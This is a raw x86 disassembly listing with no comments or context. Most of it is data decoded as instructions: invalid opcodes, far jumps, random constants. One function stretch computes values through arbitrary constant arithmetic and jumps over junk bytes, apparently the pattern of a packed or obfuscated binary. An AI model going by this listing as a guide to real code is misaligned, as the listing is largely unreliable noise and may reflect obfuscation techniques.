  40f11f:	(bad)  
  40f121:	movq   QWORD PTR [eax],mm5
  40f124:	sbb    DWORD PTR [ebx+0x3ac86753],eax
  40f12a:	xor    ch,dl
  40f12c:	fisub  DWORD PTR ds:0x7e046aaa
  40f132:	push   ebx
  40f133:	xchg   BYTE PTR [eax-0x78],cl
  40f136:	fmul   DWORD PTR [edx-0x7e]
  40f13a:	dec    ebx
  40f13b:	and    DWORD PTR [edi+0x3e6f25e5],ebx
  40f141:	and    eax,0x6bd1a5e3
  40f146:	jmp    0x40f103
  40f148:	jo     0x40f176
  40f14a:	push   esi
  40f14b:	xlat   BYTE PTR ds:[ebx]
  40f14c:	pop    eax
  40f14d:	cwde   
  40f14e:	jmp    0xe04dee5d
  40f153:	cs mov ebp,0x626e2817
  40f159:	xchg   ebx,eax
  40f15a:	stos   DWORD PTR es:[edi],eax
  40f15b:	enter  0x9212,0x29
  40f15f:	rcr    BYTE PTR [ebx-0x66],cl
  40f162:	mov    ch,0x10
  40f164:	cdq    
  40f165:	ret    
  40f166:	push   0x6b
  40f168:	adc    al,0x0
  40f16a:	dec    esi
  40f16b:	(bad)  
  40f16c:	mov    bh,0xb3
  40f16e:	aam    0x4d
  40f170:	sub    ah,BYTE PTR [edx-0x69a8d4d1]
  40f176:	mov    esi,0x7e16237e
  40f17b:	or     DWORD PTR [eax-0x10],edx
  40f17e:	lds    eax,FWORD PTR [ecx]
  40f180:	xor    BYTE PTR [ebp+0x54d85e89],dl
  40f186:	and    eax,0x91373f0f
  40f18b:	loop   0x40f18e
  40f18d:	adc    DWORD PTR [ecx-0x64],eax
  40f190:	jmp    0x6a6:0x43c06080
  40f197:	int    0x28
  40f199:	(bad)  
  40f19a:	push   esp
  40f19b:	fidiv  DWORD PTR [ebp+0x56438af8]
  40f1a1:	xchg   BYTE PTR [esi+0x521ddc41],cl
  40f1a7:	add    BYTE PTR [edi+edi*4+0x39887442],0x64
  40f1af:	test   eax,0xcd38c7cc
  40f1b4:	sahf   
  40f1b5:	push   cs
  40f1b6:	cmp    DWORD PTR [edi-0x60037bca],edi
  40f1bc:	sub    al,0xb5
  40f1be:	mov    dh,0xd9
  40f1c0:	cmc    
  40f1c1:	cs cmp eax,0x3e0413d9
  40f1c7:	test   DWORD PTR [ecx+ebp*1],ecx
  40f1ca:	out    dx,eax
  40f1cb:	les    esi,FWORD PTR [ecx+ecx*4-0x7fb735e]
  40f1d2:	aas    
  40f1d3:	arpl   WORD PTR [edx],bp
  40f1d5:	push   cs
  40f1d6:	inc    ebx
  40f1d7:	jbe    0x40f192
  40f1d9:	test   DWORD PTR fs:[esp+edi*2-0x38],ebx
  40f1de:	or     BYTE PTR [edx-0x69],al
  40f1e1:	mov    esi,0xc0bd525a
  40f1e6:	shr    BYTE PTR [eax],0xbb
  40f1e9:	adc    dl,ch
  40f1eb:	nop
  40f1ec:	ins    DWORD PTR es:[edi],dx
  40f1ed:	push   0x32eeb5b5
  40f1f2:	sub    DWORD PTR [eax+0x53d28783],edi
  40f1f8:	mov    eax,ds:0x86887f8f
  40f1fd:	inc    eax
  40f1fe:	pop    edx
  40f1ff:	mov    ds:0x1a0c12f8,eax
  40f204:	adc    eax,0x27e15a42
  40f209:	call   0x3a0e:0x8f3eabc7
  40f210:	dec    esp
  40f211:	pand   mm1,QWORD PTR [eax+0x5c]
  40f215:	pop    ss
  40f216:	push   edi
  40f217:	and    dl,BYTE PTR [ebx]
  40f219:	cmp    esp,DWORD PTR [esi]
  40f21b:	mov    eax,0x4fdc1aaf
  40f220:	mov    al,0x16
  40f222:	ret    0x922e
  40f225:	xchg   ebx,eax
  40f226:	dec    eax
  40f227:	pop    ds
  40f228:	repz mov bl,0xa0
  40f22b:	or     BYTE PTR [eax],ah
  40f22d:	nop
  40f22e:	jmp    0x40f1ce
  40f230:	mov    cl,0x75
  40f232:	and    DWORD PTR [eax],edx
  40f234:	(bad)  
  40f235:	jnp    0x40f1f6
  40f237:	dec    ebx
  40f238:	fst    DWORD PTR [edi]
  40f23a:	and    eax,DWORD PTR [eax-0x29]
  40f23d:	adc    al,0xa9
  40f23f:	mov    bl,0xf4
  40f241:	add    edx,DWORD PTR ds:0xd017a015
  40f247:	and    edi,DWORD PTR [eax-0xbd1c436]
  40f24d:	xchg   BYTE PTR [ecx-0x54cfc63e],bl
  40f253:	pusha  
  40f254:	mov    fs,WORD PTR es:[ebp+0x2]
  40f258:	ins    DWORD PTR es:[edi],dx
  40f259:	inc    edi
  40f25a:	test   eax,0xb964a5e4
  40f25f:	cmp    ch,ah
  40f261:	sar    BYTE PTR [esi],1
  40f263:	les    ecx,FWORD PTR [esi-0x24eb2882]
  40f269:	in     al,dx
  40f26a:	jecxz  0x40f1fa
  40f26c:	scas   al,BYTE PTR es:[edi]
  40f26d:	(bad)  
  40f26e:	and    eax,0xd4d96f8f
  40f273:	mov    ecx,0x586249a0
  40f278:	jle    0x40f273
  40f27a:	push   es
  40f27b:	xchg   edx,eax
  40f27c:	sbb    eax,0x2b500ee1
  40f281:	jae    0x40f2ae
  40f283:	push   esp
  40f284:	fsubp  st(5),st
  40f286:	cmp    eax,0x50692fcb
  40f28b:	xchg   al,al
  40f28d:	or     al,bh
  40f28f:	mov    ds:0x490999f0,al
  40f294:	mov    ds:0x34ede39a,al
  40f299:	jno    0x40f273
  40f29b:	daa    
  40f29c:	pushf  
  40f29d:	das    
  40f29e:	sbb    dl,BYTE PTR [eax]
  40f2a0:	and    DWORD PTR [edi-0x2eae0f6d],0x40b7ec5c
  40f2aa:	ret    0x11d
  40f2ad:	imul   ecx,edx,0x74747d92
  40f2b3:	add    cl,BYTE PTR [esi]
  40f2b5:	gs inc ebx
  40f2b7:	popf   
  40f2b8:	jp     0x40f31e
  40f2ba:	xor    dh,bl
  40f2bc:	cmp    dh,dh
  40f2be:	mov    ah,0x21
  40f2c0:	inc    eax
  40f2c1:	xor    esi,esp
  40f2c3:	push   ebx
  40f2c4:	scas   eax,DWORD PTR es:[edi]
  40f2c5:	je     0x40f26d
  40f2c7:	cli    
  40f2c8:	scas   al,BYTE PTR es:[edi]
  40f2c9:	jl     0x40f2ca
  40f2cb:	out    dx,eax
  40f2cc:	ror    esi,0x4d
  40f2cf:	(bad)  
  40f2d0:	fwait
  40f2d1:	sahf   
  40f2d2:	pop    esi
  40f2d3:	dec    esi
  40f2d4:	retf   
  40f2d5:	and    BYTE PTR [edi],bl
  40f2d7:	cmp    eax,0x6c4096b8
  40f2dc:	and    ecx,edi
  40f2de:	and    DWORD PTR [ecx],ebp
  40f2e0:	aad    0xaf
  40f2e2:	mov    cl,BYTE PTR [eax-0x26505e39]
  40f2e8:	rcr    BYTE PTR [ebp+eax*2-0x44],0x50
  40f2ed:	push   eax
  40f2ee:	(bad)  
  40f2ef:	xchg   ebx,eax
  40f2f0:	fcomp  QWORD PTR [esi-0x8]
  40f2f3:	das    
  40f2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2f5:	mov    DWORD PTR [eax+0x30],ecx
  40f2f8:	out    dx,al
  40f2f9:	shl    DWORD PTR [ebx+0x65],1
  40f2fc:	cmp    ebx,DWORD PTR [ebp+0x4c]
  40f2ff:	mov    dh,ah
  40f301:	push   ebx
  40f302:	add    eax,0xa8d04b1d
  40f307:	cmp    al,0x1c
  40f309:	dec    eax
  40f30a:	push   ebp
  40f30b:	add    eax,0xc798abe6
  40f310:	cmp    dl,ch
  40f312:	push   eax
  40f313:	mov    ah,0xe1
  40f315:	pop    es
  40f316:	in     eax,dx
  40f317:	lea    ebp,[ebp-0x78]
  40f31a:	ret    0xf803
  40f31d:	cdq    
  40f31e:	aam    0xdf
  40f320:	cs ret 
  40f322:	ret    
  40f323:	dec    esi
  40f324:	in     al,0xe0
  40f326:	icebp  
  40f327:	fild   DWORD PTR [ecx]
  40f329:	or     eax,0xb359bdb0
  40f32e:	dec    ebp
  40f32f:	or     BYTE PTR [ecx-0x20],cl
  40f332:	sub    DWORD PTR [esi+0x146d3c2c],0xa35d4d6c
  40f33c:	ins    DWORD PTR es:[edi],dx
  40f33d:	jle    0x40f39c
  40f33f:	test   al,0x36
  40f341:	sub    dh,bh
  40f343:	mov    gs:0xbf69c8bf,eax
  40f349:	push   0xf
  40f34b:	xor    cl,dl
  40f34d:	add    eax,ecx
  40f34f:	pop    esi
  40f350:	pop    esi
  40f351:	pop    ebx
  40f352:	leave  
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0x3c
  40f384:	xlat   BYTE PTR ds:[ebx]
  40f385:	ja     0x40f403
  40f387:	sub    ebp,DWORD PTR [eax+0x14be1818]
  40f38d:	sbb    BYTE PTR [eax],bl
  40f38f:	out    dx,al
  40f390:	out    0x95,eax
  40f392:	(bad)  
  40f394:	ins    DWORD PTR es:[edi],dx
  40f395:	icebp  
  40f396:	leave  
  40f397:	cmp    DWORD PTR [ebx+0x16],0x7c678de6
  40f39e:	cmp    eax,0x8e5a5040
  40f3a3:	out    dx,al
  40f3a4:	jg     0x40f3c7
  40f3a6:	mov    ds:0xf7632cd5,eax
  40f3ab:	mov    ebp,0xd0ecd6b
  40f3b0:	retf   0xd5d4
  40f3b3:	mov    ebx,0x5848f606
  40f3b8:	or     BYTE PTR [edx-0xeb8556f],al
  40f3be:	sub    esp,ecx
  40f3c0:	sahf   
  40f3c1:	adc    eax,0x52b8f4b3
  40f3c6:	pop    es
  40f3c7:	hlt    
  40f3c8:	pushf  
  40f3c9:	lock lods eax,DWORD PTR ds:[esi]
  40f3cb:	bound  esp,QWORD PTR [esi+0x62c1bc84]
  40f3d1:	bound  esi,QWORD PTR [ecx]
  40f3d3:	inc    esp
  40f3d4:	and    eax,0x6b65dfab
  40f3d9:	pop    esi
  40f3da:	(bad)  
  40f3db:	jns    0x40f384
  40f3dd:	pop    esi
  40f3de:	or     BYTE PTR [ebp+0x1c51e660],ch
  40f3e4:	lar    ebp,WORD PTR [ecx]
  40f3e7:	bound  esp,QWORD PTR [edi+0x37de950e]
  40f3ed:	pop    ebx
  40f3ee:	or     dh,BYTE PTR [edx]
  40f3f0:	pop    ecx
  40f3f1:	ds sub eax,0x6ff5dfa5
  40f3f7:	mov    cs,WORD PTR [ecx+0x751e4db7]
  40f3fd:	ja     0x40f47e
  40f3ff:	in     eax,dx
  40f400:	(bad)
  40f403:	sar    BYTE PTR [edx+0x16],1
  40f406:	xor    bl,BYTE PTR [ebp+0x6b]
  40f409:	es (bad) 
  40f40b:	pop    ds
  40f40c:	mov    DWORD PTR [edi+0x5],esi
  40f40f:	cmp    edi,DWORD PTR [ecx+edx*2+0x1f]
  40f413:	cld    
  40f414:	jp     0x40f3e2
  40f416:	pushf  
  40f417:	dec    ebp
  40f418:	inc    BYTE PTR [esi+0x2f]
  40f41b:	add    BYTE PTR [edx-0x5128ef31],ch
  40f421:	sub    dh,BYTE PTR [ebp-0x23]
  40f424:	int3   
  40f425:	xor    esp,ebx
  40f427:	and    dh,BYTE PTR [ecx-0x74]
  40f42a:	push   ebp
  40f42b:	push   0x3d3ad705
  40f430:	or     eax,0xbeb16670
  40f435:	rol    BYTE PTR [esi-0x288ad373],0x44
  40f43c:	sub    bh,BYTE PTR [ebx-0x1986d162]
  40f442:	mov    ds:0x4d9ad24,eax
  40f447:	and    al,0x6d
  40f449:	lods   al,BYTE PTR ds:[esi]
  40f44a:	call   0xf19c:0x498779fd
  40f451:	push   edi
  40f452:	or     esi,DWORD PTR [ebx+0x61]
  40f455:	pop    ebx
  40f456:	mov    WORD PTR [ebx+ebp*1],?
  40f459:	mov    esp,0xee6fcfaf
  40f45e:	and    esi,DWORD PTR [eax]
  40f460:	adc    DWORD PTR [edx-0x11],esp
  40f463:	jmp    0x40f40e
  40f465:	pop    edx
  40f466:	test   al,0x3
  40f468:	jle    0x40f4d9
  40f46a:	imul   esi,DWORD PTR [eax],0xa88648b
  40f470:	xlat   BYTE PTR ds:[ebx]
  40f471:	cmp    ah,BYTE PTR [esi-0x683575ff]
  40f477:	sahf   
  40f478:	mov    ebp,DWORD PTR [esi]
  40f47a:	add    ah,BYTE PTR [esi]
  40f47c:	push   ebp
  40f47d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f47e:	mov    fs,edx
  40f480:	test   DWORD PTR [esi],ecx
  40f482:	push   eax
  40f483:	inc    ebp
  40f484:	test   eax,0x335a108b
  40f489:	mov    cl,0xa0
  40f48b:	sub    BYTE PTR [esi+0x39c6df2d],dh
  40f491:	sub    dh,BYTE PTR [ebx-0xdfbaff5]
  40f497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f498:	iret   
  40f499:	sbb    al,0x23
  40f49b:	fcomp  QWORD PTR ds:0x56fe0b6b
  40f4a1:	or     eax,0xc195d870
  40f4a6:	mov    bh,0xdf
  40f4a8:	mov    al,0x74
  40f4aa:	xor    edx,DWORD PTR [ebx-0x59]
  40f4ad:	jg     0x40f4a3
  40f4af:	inc    edx
  40f4b0:	adc    DWORD PTR [ecx+0x66],ebp
  40f4b3:	nop
  40f4b4:	push   ecx
  40f4b5:	mul    DWORD PTR [esi+0x3f]
  40f4b8:	pushf  
  40f4b9:	cmp    dh,cl
  40f4bb:	push   es
  40f4bc:	scas   eax,DWORD PTR es:[edi]
  40f4bd:	les    ebp,FWORD PTR [ebx]
  40f4bf:	retf   
  40f4c0:	push   ecx
  40f4c1:	xor    BYTE PTR [ebp+0xf],bl
  40f4c4:	in     al,dx
  40f4c5:	adc    DWORD PTR [ebx-0x47],0xf4d9dbba
  40f4cc:	add    al,dh
  40f4ce:	xor    DWORD PTR [edx+0x2460e85c],edi
  40f4d4:	lea    ebx,[edx]
  40f4d6:	in     eax,dx
  40f4d7:	push   edx
  40f4d8:	jge    0x40f4f0
  40f4da:	add    al,0xdd
  40f4dc:	je     0x40f551
  40f4de:	adc    eax,0xdd5bc1de
  40f4e3:	int3   
  40f4e4:	int3   
  40f4e5:	jae    0x40f494
  40f4e7:	shl    DWORD PTR [eax],cl
  40f4e9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4eb:	fnstsw WORD PTR [ecx-0x4b]
  40f4ee:	inc    edi
  40f4ef:	adc    BYTE PTR [ebx+0x62],0x2e
  40f4f3:	fcmove st,st(2)
  40f4f5:	or     DWORD PTR [ecx+0x7d4f0471],esi
  40f4fb:	rol    BYTE PTR [edx-0x80],cl
  40f4fe:	js     0x40f4d0
  40f500:	fs jmp 0xcf9cea45
  40f506:	sub    BYTE PTR [eax+0x5267b250],dl
  40f50c:	out    dx,al
  40f50d:	int3   
  40f50e:	aam    0xbc
  40f510:	cdq    
  40f511:	mov    dh,0x10
  40f513:	ja     0x40f591
  40f515:	rcl    DWORD PTR [ebx+eax*4],cl
  40f518:	pushf  
  40f519:	cs and bh,ah
  40f51c:	bndldx bnd0,ds:0x74f3318b
  40f523:	fst    DWORD PTR [edx]
  40f525:	add    ah,BYTE PTR [eax]
  40f527:	clc    
  40f528:	test   al,0x6f
  40f52a:	test   BYTE PTR [edi],dl
  40f52c:	inc    edi
  40f52d:	add    eax,DWORD PTR [esi-0x2232d49b]
  40f533:	es ret 0xf417
  40f537:	(bad)  
  40f538:	mov    ds:0x86cae1ef,eax
  40f53d:	jle    0x40f588
  40f53f:	add    BYTE PTR [eax-0x6c],al
  40f542:	pop    esi
  40f543:	jge    0x40f544
  40f545:	and    al,ah
  40f547:	test   BYTE PTR [edx+edi*2+0x6d],al
  40f54b:	dec    ebx
  40f54c:	and    edx,edx
  40f54e:	adc    ah,BYTE PTR [edi-0xd]
  40f551:	xchg   ebx,eax
  40f552:	lods   eax,DWORD PTR ds:[esi]
  40f553:	sbb    al,BYTE PTR ds:0x90b605e
  40f559:	sub    eax,0x8e55fa58
  40f55e:	cmp    eax,DWORD PTR [edi+0x26]
  40f561:	test   eax,0x75b0762e
  40f566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f567:	ror    DWORD PTR [edi-0xc],cl
  40f56a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f56b:	rcl    BYTE PTR [edx],1
  40f56d:	cmp    ah,BYTE PTR [eax]
  40f56f:	loope  0x40f5a3
  40f571:	inc    ebp
  40f572:	add    eax,0x8e553bf
  40f577:	pushf  
  40f578:	mov    cl,0x5
  40f57a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f57b:	cld    
  40f57c:	sub    ecx,DWORD PTR [ebx+0x2]
  40f57f:	sbb    al,0xc1
  40f581:	ret    
  40f582:	jmp    0x91c6:0x911d32ad
  40f589:	xchg   ebx,eax
  40f58a:	sbb    al,0x9c
  40f58c:	retf   
  40f58d:	and    ah,ch
  40f58f:	xchg   ebp,eax
  40f590:	sbb    eax,0x618c42de
  40f595:	test   BYTE PTR ds:0x1be91c0d,ch
  40f59b:	aad    0xc9
  40f59d:	mov    eax,0xde93ae6c
  40f5a2:	mov    DWORD PTR [ebx],ebx
  40f5a4:	ins    DWORD PTR es:[edi],dx
  40f5a5:	adc    edx,DWORD PTR [ecx-0x5588de21]
  40f5ab:	mov    WORD PTR [esi],fs
  40f5ad:	lahf   
  40f5ae:	sahf   
  40f5af:	mov    eax,ds:0x32db831e
  40f5b4:	(bad)  
  40f5b5:	sbb    al,BYTE PTR [ecx-0x12d3abcf]
  40f5bb:	fisttp QWORD PTR [ebx-0x33877fb6]
  40f5c1:	xchg   BYTE PTR [eax+eiz*2-0x64515a6e],al
  40f5c8:	lfs    esp,FWORD PTR [edi+eiz*1-0x2d31a669]
  40f5d0:	(bad)  [edi+0x73]
  40f5d3:	xchg   BYTE PTR [eax+0x45],cl
  40f5d6:	fdivr  st(2),st
  40f5d8:	test   ebx,ebp
  40f5da:	pop    ebp
  40f5db:	xchg   BYTE PTR ds:0x1f3d4b76,cl
  40f5e1:	loopne 0x40f5f0
  40f5e3:	popf   
  40f5e4:	imul   edi,DWORD PTR [edi],0xffffffeb
  40f5e7:	retf   0xc985
  40f5ea:	js     0x40f5b3
  40f5ec:	mov    fs,WORD PTR [ebx-0x31]
  40f5ef:	push   es
  40f5f0:	and    DWORD PTR [ecx],ecx
  40f5f2:	mov    esp,0x9ef7e6ef
  40f5f7:	xchg   edi,eax
  40f5f8:	je     0x40f5f6
  40f5fa:	pop    esp
  40f5fb:	ja     0x40f5c4
  40f5fd:	rcr    BYTE PTR [esp+edi*4],1
  40f600:	sub    DWORD PTR [eiz*1-0x34de2980],0x83f39c0e
  40f60b:	mov    ds:0xc83ab869,al
  40f610:	das    
  40f611:	jae    0x40f5a5
  40f613:	push   es
  40f614:	lods   eax,DWORD PTR ds:[esi]
  40f615:	ret    
  40f616:	out    0x7a,eax
  40f618:	outs   dx,BYTE PTR ds:[esi]
  40f619:	ficomp DWORD PTR [eax-0x76]
  40f61c:	rol    BYTE PTR [esi-0x2c7ce4aa],1
  40f622:	jnp    0x40f5cc
  40f624:	in     al,dx
  40f625:	pop    ebp
  40f626:	out    0x49,eax
  40f628:	sbb    ch,dh
  40f62a:	imul   esi,ebp,0xf
  40f62d:	retf   
  40f62e:	jmp    0xca6be97c
  40f633:	out    dx,al
  40f634:	push   0x8d1254
  40f639:	pop    esp
  40f63a:	xchg   ebx,eax
  40f63b:	ror    BYTE PTR [edx-0x742acbd7],0x4d
  40f642:	clc    
  40f643:	add    eax,0x1ca5
  40f648:	or     eax,ecx
  40f64a:	mov    ecx,DWORD PTR ds:0x422538
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x42266c
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx-0x55164f65],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	jns    0x40f7b0
  40f733:	push   ecx
  40f734:	sub    DWORD PTR [ebx-0x75],edx
  40f737:	mov    ch,0xf
  40f739:	call   0xaf86:0x99043956
  40f740:	mov    edx,0x7dd71d2
  40f745:	jmp    0x40f772
  40f747:	in     eax,dx
  40f748:	jmp    0x4c0dfa61
  40f74d:	xchg   BYTE PTR [ecx-0x26aba97a],bh
  40f753:	cs cmp edi,esi
  40f756:	pop    edx
  40f757:	cmc    
  40f758:	mov    bl,0x77
  40f75a:	jns    0x40f7bf
  40f75c:	jp     0x40f749
  40f75e:	lods   eax,DWORD PTR ds:[esi]
  40f75f:	xchg   edi,eax
  40f760:	daa    
  40f761:	cmp    eax,0x2923e37
  40f766:	cmp    edx,DWORD PTR [ebp-0xc]
  40f769:	ins    BYTE PTR es:[edi],dx
  40f76a:	push   ebp
  40f76b:	add    BYTE PTR [edx+0x95d40f4],bh
  40f771:	clc    
  40f772:	push   ds
  40f773:	clc    
  40f774:	(bad)  [edi+0x72856a20]
  40f77a:	popf   
  40f77b:	nop
  40f77c:	jnp    0x40f71c
  40f77e:	sahf   
  40f77f:	pop    edi
  40f780:	sbb    BYTE PTR [ebx+0x2f],al
  40f783:	lahf   
  40f784:	push   0xe07d2733
  40f789:	scas   eax,DWORD PTR es:[edi]
  40f78a:	xchg   ebp,eax
  40f78b:	cdq    
  40f78c:	cs fcmovu st,st(4)
  40f78f:	push   eax
  40f790:	scas   al,BYTE PTR es:[edi]
  40f791:	lea    eax,[esi+edx*4]
  40f794:	sahf   
  40f795:	jmp    0x1ac:0xb014b6ee
  40f79c:	(bad)  
  40f79d:	in     eax,0xcf
  40f79f:	mov    ebx,0x8647be47
  40f7a4:	retf   
  40f7a5:	mov    al,0xab
  40f7a7:	dec    ecx
  40f7a8:	xor    BYTE PTR [edi+0x5f2831ac],0x96
  40f7af:	icebp  
  40f7b0:	fimul  WORD PTR [ecx-0x63]
  40f7b3:	je     0x40f762
  40f7b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7b6:	call   0xbcaea5b
  40f7bb:	scas   eax,DWORD PTR es:[edi]
  40f7bc:	fadd   QWORD PTR [ebp-0x7c]
  40f7bf:	push   cs
  40f7c0:	xor    cl,dh
  40f7c2:	cmp    bh,0xc4
  40f7c5:	jo     0x40f7ce
  40f7c7:	and    al,0x6b
  40f7c9:	int    0xdf
  40f7cb:	xor    DWORD PTR [edi+0x3411f938],ebx
  40f7d1:	inc    esi
  40f7d2:	jl     0x40f81f
  40f7d4:	sub    ebp,DWORD PTR [eax]
  40f7d6:	xlat   BYTE PTR ds:[ebx]
  40f7d7:	arpl   WORD PTR [eax],si
  40f7d9:	xor    DWORD PTR [esi],eax
  40f7db:	cmp    al,0x99
  40f7dd:	pop    ecx
  40f7de:	mov    edx,0x2899443b
  40f7e3:	jb     0x40f7b9
  40f7e5:	jns    0x40f7bd
  40f7e7:	and    DWORD PTR [eax],edx
  40f7e9:	adc    eax,DWORD PTR [edx-0x62]
  40f7ec:	test   eax,0x9e94644a
  40f7f1:	mov    bl,BYTE PTR [ebp-0x15]
  40f7f4:	rol    DWORD PTR [ecx+0x136aea02],cl
  40f7fa:	adc    eax,0xa5a68e44
  40f7ff:	in     al,dx
  40f800:	lods   eax,DWORD PTR ds:[esi]
  40f801:	jmp    FWORD PTR [edi+0x31957339]
  40f807:	(bad)  
  40f808:	xchg   edx,eax
  40f809:	cld    
  40f80a:	outs   dx,BYTE PTR ds:[esi]
  40f80b:	or     ebx,DWORD PTR [edi-0x1b]
  40f80e:	and    ah,BYTE PTR [edi+0x57]
  40f811:	sub    ecx,DWORD PTR [eax+edx*4+0x75d9476e]
  40f818:	jl     0x40f7e3
  40f81a:	mov    DWORD PTR [ebp-0x66],eax
  40f81d:	xchg   edi,eax
  40f81e:	sub    al,0x8f
  40f820:	repnz sar BYTE PTR [ebx+0x577b3ef4],1
  40f827:	fwait
  40f828:	lods   eax,DWORD PTR ds:[esi]
  40f829:	dec    ebx
  40f82a:	sub    eax,0xa187701
  40f82f:	mov    ds:0xd3ababbe,eax
  40f834:	inc    ecx
  40f835:	cmp    al,0x4c
  40f837:	sti    
  40f838:	(bad)  
  40f839:	addr16 in eax,dx
  40f83b:	js     0x40f8b1
  40f83d:	out    dx,al
  40f83e:	sbb    ecx,ecx
  40f840:	popf   
  40f841:	dec    esp
  40f842:	rcl    BYTE PTR [ecx+0x77],1
  40f845:	mov    ah,0x9d
  40f847:	std    
  40f848:	fldcw  WORD PTR [ecx+0x627e7303]
  40f84e:	inc    ebx
  40f84f:	or     DWORD PTR [edx+0x52cb8118],ebx
  40f855:	sub    ecx,esp
  40f857:	sub    ecx,DWORD PTR [esi+0x50a378d4]
  40f85d:	add    ch,dh
  40f85f:	add    DWORD PTR [edx+eiz*1-0x2d],ebp
  40f863:	push   ds
  40f864:	dec    esi
  40f865:	sti    
  40f866:	or     eax,0x91de9693
  40f86b:	test   al,0x1d
  40f86d:	pop    esi
  40f86e:	mov    eax,0x794cd05e
  40f873:	push   es
  40f874:	dec    DWORD PTR [eax]
  40f876:	fs test al,0x5
  40f879:	push   ebp
  40f87a:	adc    DWORD PTR [esi+eax*1+0x30],esi
  40f87e:	call   0xa73d:0xbb0021ef
  40f885:	(bad)  
  40f886:	mov    cl,0x3f
  40f888:	jbe    0x40f887
  40f88a:	or     DWORD PTR [ebx-0x6e],ecx
  40f88d:	repnz enter 0xf5d,0x77
  40f892:	loopne 0x40f828
  40f894:	popa   
  40f895:	jmp    0x40f8b1
  40f897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f898:	push   ecx
  40f899:	adc    edi,DWORD PTR [edx+esi*1-0x37ac7a0f]
  40f8a0:	enter  0x25b3,0xa3
  40f8a4:	(bad)  
  40f8a5:	and    eax,0x345ee7a6
  40f8aa:	test   eax,0xb54b2b65
  40f8af:	int    0x12
  40f8b1:	dec    edx
  40f8b2:	xlat   BYTE PTR ds:[ebx]
  40f8b3:	cmp    al,0xaa
  40f8b5:	outs   dx,BYTE PTR ds:[esi]
  40f8b6:	in     eax,0xd2
  40f8b8:	sub    ah,cl
  40f8ba:	jmp    0x40f8f8
  40f8bc:	mov    ebx,0x41c0bd28
  40f8c1:	mov    bl,BYTE PTR [esi]
  40f8c3:	jne    0x40f91f
  40f8c5:	pop    esi
  40f8c6:	mov    al,ds:0x1518d8b6
  40f8cb:	mov    ebx,0x16d70126
  40f8d0:	es sub eax,0xef75dda2
  40f8d6:	cwde   
  40f8d7:	mov    BYTE PTR [ebx-0x3d37d042],cl
  40f8dd:	sub    BYTE PTR [ebp-0x55275660],bh
  40f8e3:	sahf   
  40f8e4:	add    al,0x20
  40f8e6:	sub    BYTE PTR [ecx+0x64],ah
  40f8e9:	fisubr WORD PTR [ebx+0x35]
  40f8ec:	xchg   ebp,eax
  40f8ed:	push   ss
  40f8ee:	mov    cl,0x22
  40f8f0:	test   esi,esp
